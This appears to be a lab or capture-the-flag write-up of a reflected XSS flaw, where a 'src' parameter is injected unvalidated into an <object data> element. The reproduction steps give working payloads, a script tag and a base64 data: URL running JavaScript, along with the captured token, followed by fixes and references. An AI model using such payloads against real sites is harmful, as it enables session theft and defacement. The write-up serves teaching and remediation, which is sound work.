# Unvalidated Resource Inclusion → XSS (media)

**One‑liner:** The `src` parameter is injected into an `<object data=...>` element without validation. Supplying a `data:` URL that contains HTML/JS executes in the page and returns a token.

---

## Where

* **URL:** `http://127.0.0.1:8080/index.php?page=media&src=nsa`
* **Rendered HTML:**

```html
<td align="center" style="vertical-align:middle;font-size:1.5em;">
    File: nsa_prism.jpg
</td>
<td style="vertical-align:middle;">
    <object data="http://10.0.2.15/images/nsa_prism.jpg">
    </object>
</td>
```

* **Auth:** none

---

## How to reproduce (paste into the `src` query value)

1. Try a direct script (filtered), then use a **data URL**:

```
?page=media&src=<script>alert('salut');</script>
```

2. Use a **data URL** with base64‑encoded HTML/JS:

```
?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnc2FsdXQnKTwvc2NyaXB0Pg==
```

**Observed:** the browser executes the script and the app returns a token:

```
928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d
```

*NB:* We can generate any payload by base64‑encoding any small HTML page with `<script>...</script>` and prefixing with `data:text/html;base64,`.

---

## Why this happens

* **User‑controlled URL in an embedding context:** The backend takes `src` and places it directly into `<object data=...>`.
* **No allow‑list / scheme restrictions:** Dangerous schemes like `data:` (or `javascript:`) are allowed, so the browser loads attacker‑controlled HTML/JS.
* **No output encoding:** The attribute value is not sanitized or encoded.

---

## Impact

* **Reflected XSS / content injection:** Execute arbitrary JS in the victim’s origin → session theft, CSRF, defacement.
* **Open gadget for phishing:** Loading arbitrary external/document content inside the page.
* In this lab, the vulnerable path yields a **token** when triggered.

**Severity:** High (no auth, trivial, arbitrary script execution).

---

## Fix (server‑side — mandatory)

1. **Allow‑list values**: map short keys to known media files on the server (e.g., `nsa` → `/images/nsa_prism.jpg`). Refuse anything else.
2. **Restrict schemes & origins**: only allow `https://` from trusted hosts; **reject** `data:`, `javascript:`, `file:`, `blob:`, and protocol‑relative URLs.
3. **Render safely**: avoid `<object>` for untrusted content. Prefer `<img>` for images and serve only static files from your domain.
4. **Output encoding**: HTML‑encode attribute values if any user input is reflected.
5. **CSP hardening**: set a strict Content Security Policy, e.g.:

   * `default-src 'self'; object-src 'none'; frame-src 'self'; img-src 'self'; script-src 'self';` (avoid `data:` in `script-src`/`object-src`).

---
## References

* OWASP Cheat Sheet: **XSS Prevention**; **Untrusted Data in HTML Attributes**
* CWE‑79: **Cross‑Site Scripting (XSS)**
* CWE‑829: **Inclusion of Functionality from Untrusted Control Sphere**

--- 
## See also
**index** → [here](/README.md)